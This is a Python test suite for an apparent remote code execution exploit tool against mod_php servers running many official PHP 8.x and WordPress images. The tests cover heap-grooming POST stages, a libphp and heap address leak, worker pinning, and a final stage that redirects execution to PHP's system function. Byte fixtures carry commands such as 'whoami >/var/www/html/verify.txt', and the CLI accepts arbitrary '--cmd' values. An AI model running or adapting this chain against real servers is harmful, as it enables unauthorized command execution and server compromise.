from __future__ import annotations

from contextlib import redirect_stdout
import hashlib
import io
import json
from dataclasses import replace
from pathlib import Path
import subprocess
import sys
import tempfile
from types import SimpleNamespace
import unittest
from unittest.mock import patch


ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from chains import CHAINS
from chains.modphp_pinned.affinity import PreforkPinning
from chains.modphp_pinned.chain import http_response_body, leaked_bases
from chains.modphp_pinned.stage_a1 import A1_BOUNDARY, a1_parts, send_a1
from chains.modphp_pinned.stage_b1 import chunked_post, decode_cookie, make_body
from chains.modphp_pinned.stages_a2b2 import a2_pieces, b2_parts
from chains.modphp_pinned.wire import iter_multipart
from core.evidence import EvidenceWriter
from core.chain import RunContext
from core.http import BodyPlan, RequestPlan
from core.catalog import QualificationStatus
from core.result import Outcome, RunResult
from core.target import Target, validate_http_path
from core.transport import Http1Connection, parse_close_delimited_response
from profiles import PROFILE_CATALOG, PROFILES
from profiles.modphp_pinned._loader import _manifest_digest, load_manifest
import cli


PINNED = "modphp-pinned-v1"

LEGACY_AMD64_RELEASES = (
    "8.2.32", "8.2.33", "8.2.34",
    "8.3.22", "8.3.23", "8.3.24", "8.3.25", "8.3.26", "8.3.27",
    "8.3.28", "8.3.29", "8.3.30", "8.3.31", "8.3.32", "8.3.33",
    "8.3.35", "8.4.25", "8.4.26", "8.5.10", "8.5.11",
)
EXPECTED_LEGACY_PROFILE_IDS = {
    f"{PINNED}/php-{release}-amd64-official{suffix}"
    for release in LEGACY_AMD64_RELEASES
    for suffix in ("", "-no-ini")
} | {
    f"{PINNED}/php-8.3.35-arm64-official",
    f"{PINNED}/php-8.3.35-arm64-official-no-ini",
    f"{PINNED}/php-8.5.7-arm64-official-no-ini",
}
EXPECTED_NEW_PROFILE_IDS = {
    f"{PINNED}/php-8.4.26-arm64-official",
    f"{PINNED}/php-8.4.26-arm64-official-no-ini",
} | {
    f"{PINNED}/wordpress-php-{release}-{architecture}-{ini}"
    for release in ("8.3.35", "8.4.26")
    for architecture in ("amd64", "arm64")
    for ini in ("default", "production")
}
EXPECTED_PROFILE_IDS = EXPECTED_LEGACY_PROFILE_IDS | EXPECTED_NEW_PROFILE_IDS


class _FakeSocket:
    _next_fd = 100

    def __init__(self) -> None:
        self.sent = bytearray()
        self.closed = False
        self.fd = _FakeSocket._next_fd
        _FakeSocket._next_fd += 1

    def settimeout(self, _timeout: float) -> None:
        pass

    def setblocking(self, _value: bool) -> None:
        pass

    def sendall(self, data: bytes) -> None:
        self.sent.extend(data)

    def send(self, data: bytes) -> int:
        self.sent.extend(data)
        return len(data)

    def recv(self, _size: int, _flags: int = 0) -> bytes:
        return b""

    def fileno(self) -> int:
        return self.fd

    def close(self) -> None:
        self.closed = True


class _FailingSendSocket(_FakeSocket):
    def sendall(self, _data: bytes) -> None:
        raise OSError("synthetic send failure")


def _a1_body(calibration: object) -> bytes:
    a1 = calibration.a1
    return b"".join(iter_multipart(a1_parts(
        sid_size=a1.sid_size,
        sid_late=a1.sid_late,
        files=a1.files,
        depth=a1.depth,
        live_files=a1.live_files,
        ct1=a1.content_type_1,
        ct2=a1.content_type_2,
        fillers=a1.fillers,
        filler_name=a1.filler_name,
        filler_value=a1.filler_value,
        big=a1.big,
        big_size=a1.big_size,
        big_name=a1.big_name,
        big_name_count=a1.big_name_count,
        big_alt_name=a1.big_alt_name,
        tail_big_size=a1.tail_big_size,
        tail_big_count=a1.tail_big_count,
        burners=a1.burners,
        burner_size=a1.burner_size,
        burner_name=a1.burner_name,
        burner_long_name_count=a1.burner_long_name_count,
        burner_long_name=a1.burner_long_name,
        late_groom_fields=a1.late_groom_fields,
        late_groom_name=a1.late_groom_name,
        late_groom_value=a1.late_groom_value,
        late_groom_alt_value_count=a1.late_groom_alt_value_count,
        late_groom_alt_value=a1.late_groom_alt_value,
        released_fields=a1.released_fields,
        released_name=a1.released_name,
        released_value=a1.released_value,
        released_alt_value_count=a1.released_alt_value_count,
        released_alt_value=a1.released_alt_value,
        released_replacement_value=a1.released_replacement_value,
        released_long_replacement_count=a1.released_long_replacement_count,
        released_long_replacement_value=a1.released_long_replacement_value,
        progress_size=a1.progress_size,
    ), A1_BOUNDARY))


def _b1_body(calibration: object) -> bytes:
    b1 = calibration.b1
    return make_body(
        b"codex843b1",
        calibration.heap.stale_session_id,
        b1.fake_length,
        b1.sprays,
        b1.data_start,
        b1.nested_fields,
        b1.nested_depth,
        b1.small_fields,
        b1.small_name_size,
        b1.small_value_size,
        b1.small_after_nested,
        b1.page_spec,
        b1.tail_pages,
        b1.release_sprays,
        b1.carrier_sprays,
        b1.carrier_pages,
        abi=calibration.abi,
        allocator=calibration.allocator,
        gc_refcount=b1.fake_string_gc_refcount,
        gc_type=b1.fake_string_gc_type,
        string_hash=b1.fake_string_hash,
        marker=b1.marker,
    )


class PinnedCoreTests(unittest.TestCase):
    def _run_completed_mock_chain(
        self,
        *,
        verify_path: str | None,
        verify_text: str | None,
        verify_response: bytes | None = None,
    ) -> tuple[RunResult, str]:
        class FakePins:
            def __init__(self, *_args, **_kwargs) -> None:
                pass

            def __enter__(self):
                return self

            def __exit__(self, _exc_type, _exc, _traceback) -> None:
                pass

            def ensure_healthy(self) -> None:
                pass

        profile = PROFILES[f"{PINNED}/php-8.4.26-amd64-official"]
        args = SimpleNamespace(
            verify_path=verify_path,
            verify_text=verify_text,
            workers=1,
            cmd="id",
            leak_only=False,
        )
        context = RunContext(
            Target.parse("http://target.test/index.php"), EvidenceWriter(None),
        )
        preflight = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok"
        a1_response = (
            b"HTTP/1.1 500 Internal Server Error\r\n"
            b"Content-Length: 0\r\n\r\n"
        )
        b1_response = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
        a2_response = (
            b"HTTP/1.1 500 Internal Server Error\r\n"
            b"Content-Length: 0\r\n\r\n"
        )
        get_responses = [preflight]
        if verify_response is not None:
            get_responses.append(verify_response)
        output = io.StringIO()
        with (
            patch(
                "chains.modphp_pinned.chain.send_get",
                side_effect=get_responses,
            ),
            patch("chains.modphp_pinned.chain.PreforkPinning", FakePins),
            patch("chains.modphp_pinned.chain.run_a1", return_value=a1_response),
            patch(
                "chains.modphp_pinned.chain.run_b1",
                return_value=(b1_response, b"leak", {"marker_ok": True}),
            ),
            patch(
                "chains.modphp_pinned.chain.leaked_bases",
                return_value=(0x70000000, 0x73000000, 100),
            ),
            patch(
                "chains.modphp_pinned.chain.send_a2",
                return_value=SimpleNamespace(response=a2_response, body_bytes=123),
            ),
            patch(
                "chains.modphp_pinned.chain.send_b2",
                return_value=SimpleNamespace(response=b"", body_bytes=456),
            ),
            redirect_stdout(output),
        ):
            result = CHAINS[PINNED].run(context, profile, args)
        return result, output.getvalue()

    def test_all_legacy_worker_profiles_are_active_on_the_pinned_core(self) -> None:
        self.assertEqual(set(CHAINS), {PINNED})
        self.assertEqual(len(EXPECTED_LEGACY_PROFILE_IDS), 43)
        self.assertEqual(len(EXPECTED_NEW_PROFILE_IDS), 10)
        self.assertEqual(set(PROFILES), EXPECTED_PROFILE_IDS)
        for profile_id, profile in PROFILES.items():
            self.assertTrue(profile_id.startswith(PINNED + "/"))
            profile.validate()
            self.assertEqual(profile.scheduler.default_workers, 150)
            self.assertFalse(hasattr(profile.calibration, "pipeline"))

    def test_catalog_has_one_unique_candidate_leaf_per_active_profile(self) -> None:
        self.assertEqual(len(PROFILE_CATALOG.profiles), len(PROFILES))
        self.assertEqual(len(PROFILE_CATALOG.tracks), len(PROFILES))
        self.assertEqual(
            len({leaf.profile_digest for leaf in PROFILE_CATALOG.profiles}),
            len(PROFILES),
        )
        self.assertEqual(
            {leaf.status for leaf in PROFILE_CATALOG.profiles},
            {QualificationStatus.CANDIDATE},
        )

    def test_legacy_manifest_corpus_digest_is_stable(self) -> None:
        leaves = {leaf.profile_id: leaf for leaf in PROFILE_CATALOG.profiles}
        payload = "".join(
            f"{profile_id}\0{leaves[profile_id].profile_digest}\n"
            for profile_id in sorted(EXPECTED_LEGACY_PROFILE_IDS)
        ).encode("ascii")
        self.assertEqual(
            hashlib.sha256(payload).hexdigest(),
            "0e3c5d1ff931aa912c029a125f77e26c3efa660107dca730ec98a26829569c6b",
        )

    def test_new_profile_manifest_corpus_digest_is_stable(self) -> None:
        leaves = {leaf.profile_id: leaf for leaf in PROFILE_CATALOG.profiles}
        payload = "".join(
            f"{profile_id}\0{leaves[profile_id].profile_digest}\n"
            for profile_id in sorted(EXPECTED_NEW_PROFILE_IDS)
        ).encode("ascii")
        self.assertEqual(
            hashlib.sha256(payload).hexdigest(),
            "b360b88195528d0cc0f4e58b59957dd63eadfa3a69e82cc36c0455c935cab046",
        )

    def test_cli_status_gate_and_run_record_bind_execution_contract(self) -> None:
        leaf = PROFILE_CATALOG.profiles[0]
        self.assertIn(leaf.profile_id, cli.runnable_profile_ids())
        rejected = replace(leaf, status=QualificationStatus.REJECTED)
        with patch.dict(cli.PROFILE_LEAVES, {leaf.profile_id: rejected}, clear=True):
            self.assertNotIn(leaf.profile_id, cli.runnable_profile_ids())

        record = cli.result_record(
            RunResult(PINNED, leaf.profile_id, Outcome.UNCONFIRMED),
            profile_digest=leaf.profile_digest,
            profile_status=leaf.status,
            effective_workers=150,
        )
        self.assertEqual(record["execution_contract"], {
            "profile_digest": leaf.profile_digest,
            "profile_status": "candidate",
            "effective_workers": 150,
        })
        self.assertEqual(
            {leaf.status.value for leaf in PROFILE_CATALOG.profiles}, {"candidate"},
        )
        platform_digests = {
            leaf.platform_manifest_digest for leaf in PROFILE_CATALOG.profiles
        }
        self.assertTrue({
            "sha256:5f984e5975c8114c5a54555cbb01131861ef3057763fddad8345b53b52d3d9c3",
            "sha256:ec6f86c15947f4f7980ef100fd5cc5d1fd3b7ad9d100fcf6e9692f3266cfc3c1",
            "sha256:b0ae0e0d4a3b7f0e800017482752b94f58ab049f2d7fcd108e5452afce3f50d1",
            "sha256:be65bbdf784a5841d212f6887c2f3ed8ce97cd49b1885a1cecb391d3c9d2c095",
        } <= platform_digests)
        self.assertTrue(all(
            leaf.runtime_bundle_id.endswith("@" + leaf.platform_manifest_digest)
            for leaf in PROFILE_CATALOG.profiles
        ))

    def test_835_arm64_a1_b1_byte_fixtures(self) -> None:
        calibration = PROFILES[
            f"{PINNED}/php-8.3.35-arm64-official"
        ].calibration
        a1 = _a1_body(calibration)
        b1 = _b1_body(calibration)
        self.assertEqual((len(a1), hashlib.sha256(a1).hexdigest()), (
            991_644,
            "048b3e2ebd43e3033a62bd458eb953ef88d0811ecfe4e72780273425cc835a95",
        ))
        self.assertEqual((len(b1), hashlib.sha256(b1).hexdigest()), (
            38_280_881,
            "2d3581e96dbe5030c39f56f8a813e74602623be9f4abbc54b67395476117acb9",
        ))

    def test_8426_production_b1_byte_fixture(self) -> None:
        body = _b1_body(PROFILES[
            f"{PINNED}/php-8.4.26-amd64-official"
        ].calibration)
        self.assertEqual(len(body), 39_597_425)
        self.assertEqual(
            hashlib.sha256(body).hexdigest(),
            "b2697c3e6ec443a6b3760fb2833262ec2ad727460be6ffec0534d3437e831556",
        )

    def test_a2_and_arbitrary_command_b2_byte_fixtures(self) -> None:
        calibration = PROFILES[
            f"{PINNED}/php-8.3.35-arm64-official"
        ].calibration
        a2 = b"".join(a2_pieces(
            calibration.a2.parts,
            calibration.a2.depth,
            calibration.a2.fillers,
        ))
        pieces, ending = b2_parts(
            first_sprays=calibration.b2.first_sprays,
            second_sprays=calibration.b2.second_sprays,
            value_length=calibration.b2.value_length,
            target_address=0x7000000F9398,
            reference_refcount=calibration.b2.reference_refcount,
            name_length=calibration.b2.name_length,
            hashtable_address=0x7000000F9398,
            zif_system=0x700100377428,
            abi=calibration.abi,
            command=b"whoami>/tmp/a2b2",
        )
        b2 = b"".join(pieces) + ending
        self.assertEqual((len(a2), hashlib.sha256(a2).hexdigest()), (
            242_504,
            "d948923e710da617322f1af8805ca6ce75fc754a2c11496e7c64ead6aa23dd3a",
        ))
        self.assertEqual((len(b2), hashlib.sha256(b2).hexdigest()), (
            453_355,
            "16d31e500e9b5868540ddb3ef37a0fdb171db9b5b4adab8c5774ad03985d9c24",
        ))
        self.assertIn(b"whoami>/tmp/a2b2\0", b2)

    def test_8426_amd64_b2_carrier_fixture_and_length_invariance(self) -> None:
        calibration = PROFILES[
            f"{PINNED}/php-8.4.26-amd64-official"
        ].calibration

        def body(command: bytes) -> bytes:
            pieces, ending = b2_parts(
                first_sprays=calibration.b2.first_sprays,
                second_sprays=calibration.b2.second_sprays,
                value_length=calibration.b2.value_length,
                target_address=0x7A33E74F8398,
                reference_refcount=calibration.b2.reference_refcount,
                name_length=calibration.b2.name_length,
                hashtable_address=0x7A33E74F8398,
                zif_system=0x7A33E9449370,
                abi=calibration.abi,
                command=command,
            )
            return b"".join(pieces) + ending

        short = body(b"id")
        verified_command = b"whoami >/var/www/html/verify.txt"
        verified = body(verified_command)
        self.assertEqual(len(short), 453_355)
        self.assertEqual(len(verified), len(short))
        self.assertEqual(
            hashlib.sha256(verified).hexdigest(),
            "e89864aeff244a01de9aff7b8e3e6932d946bb30bc7b2fa232670009f040b50f",
        )
        self.assertIn(verified_command + b"\0", verified)

    def test_pinning_holds_exactly_n_minus_one_and_cleans_up(self) -> None:
        sockets = [_FakeSocket() for _ in range(4)]
        target = Target.parse("http://target.test:8080/index.php")
        with (
            patch(
                "chains.modphp_pinned.affinity.socket.create_connection",
                side_effect=sockets,
            ),
            patch(
                "chains.modphp_pinned.affinity.select.select",
                return_value=([], [], []),
            ),
        ):
            with PreforkPinning(target, 5) as pins:
                self.assertEqual(pins.held_count, 4)
                pins.ensure_healthy()
                for sock in sockets:
                    self.assertIn(b"Host: target.test:8080\r\n", sock.sent)
                    self.assertIn(b"Content-Length: 1048576\r\n", sock.sent)
        self.assertTrue(all(sock.closed for sock in sockets))

    def test_socket_setup_failures_are_closed(self) -> None:
        target = Target.parse("http://target.test:8080/index.php")

        holder = _FailingSendSocket()
        with patch(
            "chains.modphp_pinned.affinity.socket.create_connection",
            return_value=holder,
        ):
            with self.assertRaises(OSError):
                with PreforkPinning(target, 2):
                    self.fail("pinning must not start after a failed holder send")
        self.assertTrue(holder.closed)

        a1_socket = _FailingSendSocket()
        with patch(
            "chains.modphp_pinned.stage_a1.socket.create_connection",
            return_value=a1_socket,
        ):
            with self.assertRaises(OSError):
                send_a1("target.test", 80, "/index.php", [])
        self.assertTrue(a1_socket.closed)

        b1_socket = _FailingSendSocket()
        with patch(
            "chains.modphp_pinned.stage_b1.socket.create_connection",
            return_value=b1_socket,
        ):
            with self.assertRaises(OSError):
                chunked_post(
                    "target.test", 80, "/index.php", b"body", b"boundary",
                )
        self.assertTrue(b1_socket.closed)

    def test_timeout_and_request_paths_fail_before_network(self) -> None:
        for timeout in (0.0, -1.0, float("nan"), float("inf")):
            with self.subTest(timeout=timeout):
                with self.assertRaises(ValueError):
                    Target.parse("http://target.test/index.php", timeout=timeout)
        for path in ("relative", "/has space", "/line\r\nbreak", "/räksmörgås"):
            with self.subTest(path=path):
                with self.assertRaises(ValueError):
                    validate_http_path(path, label="verification path")

        profile = PROFILES[f"{PINNED}/php-8.3.35-arm64-official"]
        args = SimpleNamespace(
            verify_path="/ok\r\nX-Injected: yes",
            verify_text="proof",
            workers=None,
            cmd="id",
            leak_only=False,
        )
        context = RunContext(
            Target.parse("http://target.test/index.php"), EvidenceWriter(None),
        )
        with patch(
            "chains.modphp_pinned.chain.send_get",
            side_effect=AssertionError("network must not be used"),
        ):
            result = CHAINS[PINNED].run(context, profile, args)
        self.assertEqual(result.outcome, Outcome.REQUIREMENT_MISSING)

    def test_preflight_non_200_fails_before_worker_pinning(self) -> None:
        profile = PROFILES[f"{PINNED}/php-8.3.35-arm64-official"]
        args = SimpleNamespace(
            verify_path=None,
            verify_text=None,
            workers=None,
            cmd="id",
            leak_only=False,
        )
        context = RunContext(
            Target.parse("http://target.test/index.php"), EvidenceWriter(None),
        )
        response = b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n"
        with (
            patch("chains.modphp_pinned.chain.send_get", return_value=response),
            patch(
                "chains.modphp_pinned.chain.PreforkPinning",
                side_effect=AssertionError("workers must not be pinned"),
            ),
        ):
            result = CHAINS[PINNED].run(context, profile, args)
        self.assertEqual(result.outcome, Outcome.REQUIREMENT_MISSING)
        self.assertEqual(result.stages[0].values["status"], 404)

    def test_http_verifier_ignores_headers(self) -> None:
        response = (
            b"HTTP/1.1 200 OK\r\nX-Reflected-Proof: marker\r\n"
            b"Content-Length: 4\r\n\r\nnope"
        )
        self.assertNotIn(b"marker", http_response_body(response))
        self.assertEqual(http_response_body(response), b"nope")

    def test_failed_http_verifier_is_logged_and_reported_specifically(self) -> None:
        response = (
            b"HTTP/1.1 404 Not Found\r\n"
            b"Content-Length: 9\r\n\r\nnot found"
        )
        result, output = self._run_completed_mock_chain(
            verify_path="/verify.txt",
            verify_text="fresh-marker",
            verify_response=response,
        )

        self.assertEqual(result.outcome, Outcome.UNCONFIRMED)
        self.assertEqual(
            result.reason,
            "verification failed: GET /verify.txt returned HTTP 404",
        )
        self.assertIn("Verify status=404 marker=False", output)
        verify = result.stages[-1]
        self.assertEqual(verify.name, "verify")
        self.assertEqual(verify.reason, "verification endpoint returned HTTP 404")
        self.assertEqual(
            verify.values,
            {"status": 404, "marker_found": False},
        )

    def test_missing_verifier_is_distinct_from_failed_verification(self) -> None:
        result, output = self._run_completed_mock_chain(
            verify_path=None,
            verify_text=None,
        )

        self.assertEqual(result.outcome, Outcome.UNCONFIRMED)
        self.assertEqual(
            result.reason,
            "B2 dispatched; no independent verifier was configured",
        )
        self.assertNotIn("Verify status=", output)
        self.assertNotEqual(result.stages[-1].name, "verify")

    def test_successful_http_verifier_reports_marker(self) -> None:
        response = (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Length: 12\r\n\r\nfresh-marker"
        )
        result, output = self._run_completed_mock_chain(
            verify_path="/verify.txt",
            verify_text="fresh-marker",
            verify_response=response,
        )

        self.assertEqual(result.outcome, Outcome.SUCCESS)
        self.assertIn("Verify status=200 marker=True", output)
        self.assertEqual(
            result.stages[-1].values,
            {"status": 200, "marker_found": True},
        )

    def test_php_cookie_decoder_restores_spaces_without_losing_literal_plus(self) -> None:
        response = (
            b"HTTP/1.1 200 OK\r\n"
            b"Set-Cookie: PHPSESSID=A+B%2BC%20D; path=/\r\n\r\n"
        )
        self.assertEqual(decode_cookie(response), b"A B+C D")

    def test_libphp_bounded_main_fallback_is_unique_and_fail_closed(self) -> None:
        calibration = PROFILES[
            f"{PINNED}/php-8.4.26-amd64-official"
        ].calibration
        allocator = replace(
            calibration.allocator,
            min_libphp_main_delta=0x1800000,
            max_libphp_main_delta=0x3000000,
            main_cluster_min_slots=800,
            main_cluster_min_unique=800,
            main_cluster_min_unique_ratio=0.9,
        )
        profile = replace(calibration, allocator=allocator)
        libphp = 0x700010000000
        valid_main = libphp - 0x2200000
        wrong_dense = libphp - 0x7000000
        info = {
            "marker_ok": True,
            "decoded": profile.b1.fake_length,
            "request_main_base": wrong_dense,
            "libphp_candidates": [{
                "base": libphp,
                "exact_slots": profile.allocator.min_dtor_repetitions,
            }],
            "heap_candidates": [
                {"base": wrong_dense, "slots": 5000, "unique": 4900},
                {"base": valid_main, "slots": 1100, "unique": 1050},
            ],
        }
        self.assertEqual(
            leaked_bases(info, profile),
            (valid_main, libphp, profile.allocator.min_dtor_repetitions),
        )

        structural = dict(info, main_recovery="chunk_header")
        with self.assertRaisesRegex(RuntimeError, "implausible libphp-main delta"):
            leaked_bases(structural, profile)

        ambiguous = dict(info)
        ambiguous["heap_candidates"] = [
            *info["heap_candidates"],
            {"base": libphp - 0x2400000, "slots": 1000, "unique": 950},
        ]
        with self.assertRaisesRegex(RuntimeError, "implausible libphp-main delta"):
            leaked_bases(ambiguous, profile)

        disabled = replace(
            profile,
            allocator=replace(profile.allocator, main_cluster_min_slots=0),
        )
        with self.assertRaisesRegex(RuntimeError, "implausible libphp-main delta"):
            leaked_bases(info, disabled)

    def test_cli_help_exposes_optional_worker_override_without_catalog_dump(self) -> None:
        profile = f"{PINNED}/php-8.4.26-amd64-official-no-ini"
        result = subprocess.run(
            [
                sys.executable,
                str(ROOT / "php2shell-eth.py"),
                "run",
                "http://127.0.0.1/index.php",
                "--profile",
                profile,
                "--help",
            ],
            cwd=ROOT,
            capture_output=True,
            text=True,
            timeout=5,
            check=False,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("--workers", result.stdout)
        self.assertIn("--cmd", result.stdout)
        self.assertNotIn("php-8.3.35-arm64-official", result.stdout)

    def test_cli_introspection_is_offline(self) -> None:
        commands = (
            ["chains"],
            ["profiles"],
            ["describe", f"{PINNED}/php-8.3.35-arm64-official"],
            ["run", "--help"],
        )
        for arguments in commands:
            result = subprocess.run(
                [sys.executable, str(ROOT / "php2shell-eth.py"), *arguments],
                cwd=ROOT,
                capture_output=True,
                text=True,
                timeout=5,
                check=False,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertNotIn("Traceback", result.stderr)

    def test_profile_digest_mismatch_fails_before_network(self) -> None:
        result = subprocess.run(
            [
                sys.executable,
                str(ROOT / "php2shell-eth.py"),
                "run",
                "http://network-must-not-be-used.invalid/index.php",
                "--profile",
                f"{PINNED}/php-8.3.35-arm64-official",
                "--profile-digest",
                "sha256:" + "0" * 64,
                "--cmd",
                "id",
            ],
            cwd=ROOT,
            capture_output=True,
            text=True,
            timeout=5,
            check=False,
        )
        self.assertEqual(result.returncode, 2)
        self.assertIn("does not match", result.stderr)
        self.assertNotIn("Name or service", result.stderr)

    def test_loader_rejects_scheduler_substitution_and_invalid_run_hash(self) -> None:
        source = (
            ROOT / "profiles" / "modphp_pinned" / "manifests"
            / "php-8_3_35-amd64-official-no-ini.json"
        )
        baseline = json.loads(source.read_text(encoding="utf-8"))
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "mutated.json"

            scheduler = json.loads(json.dumps(baseline))
            scheduler["profile"]["scheduler"]["id"] = "different-scheduler/v99"
            scheduler["qualification"]["scheduler_revision"] = "different-scheduler/v99"
            digest = _manifest_digest(scheduler["profile"], scheduler["identity"])
            scheduler["manifest_digest"] = digest
            scheduler["qualification"]["bound_manifest_digest"] = digest
            path.write_text(json.dumps(scheduler), encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "scheduler is incompatible"):
                load_manifest(path)

            run_hash = json.loads(json.dumps(baseline))
            run_hash["qualification"]["run_record_sha256"] = "z" * 64
            path.write_text(json.dumps(run_hash), encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "run record SHA-256"):
                load_manifest(path)

    def test_loader_never_aliases_wordpress_to_php_runtime_contracts(self) -> None:
        source = (
            ROOT / "profiles" / "modphp_pinned" / "manifests"
            / "wordpress-php-8_3_35-arm64-default.json"
        )
        baseline = json.loads(source.read_text(encoding="utf-8"))

        def signed(document: dict) -> dict:
            digest = _manifest_digest(document["profile"], document["identity"])
            document["manifest_digest"] = digest
            document["qualification"]["bound_manifest_digest"] = digest
            return document

        mutations = {
            "PHP repository": lambda value: value["identity"].__setitem__(
                "runtime_bundle_id",
                "docker.io/library/php@"
                + value["identity"]["platform_manifest_digest"],
            ),
            "PHP ini contract": lambda value: value["identity"]["track"].__setitem__(
                "ini_contract_id", "no-main-ini",
            ),
            "PHP image alias": lambda value: value["profile"]["target"].__setitem__(
                "image", "php:8.3.35-apache",
            ),
            "main ini on default": lambda value: value["profile"]["target"].__setitem__(
                "php_ini_sha256", "0" * 64,
            ),
        }
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "mutated-wordpress.json"
            for label, mutate in mutations.items():
                with self.subTest(label=label):
                    document = json.loads(json.dumps(baseline))
                    mutate(document)
                    path.write_text(json.dumps(signed(document)), encoding="utf-8")
                    with self.assertRaises(ValueError):
                        load_manifest(path)

    def test_core_transport_and_evidence_helpers(self) -> None:
        plan = RequestPlan(
            method="POST",
            path="/index.php",
            headers=((b"X-Test", b"one"), (b"X-Test", b"two")),
            body=BodyPlan.from_bytes(b"abc"),
            framing="fixed",
        )
        connection = object.__new__(Http1Connection)
        connection.target = Target.parse("http://127.0.0.1:8080/index.php")
        head = connection.render_head(plan)
        self.assertLess(head.index(b"X-Test: one"), head.index(b"X-Test: two"))
        response = parse_close_delimited_response(
            b"HTTP/1.1 500 Internal Server Error\r\nX-Test: yes\r\n\r\nOOM"
        )
        self.assertEqual(response.status, 500)
        with tempfile.TemporaryDirectory() as base:
            root = Path(base) / "run"
            evidence = EvidenceWriter(root)
            evidence.write_json("run.json", {"outcome": "success"})
            self.assertEqual(json.loads((root / "run.json").read_text())["outcome"], "success")
            with self.assertRaises(FileExistsError):
                EvidenceWriter(root)


if __name__ == "__main__":
    unittest.main()
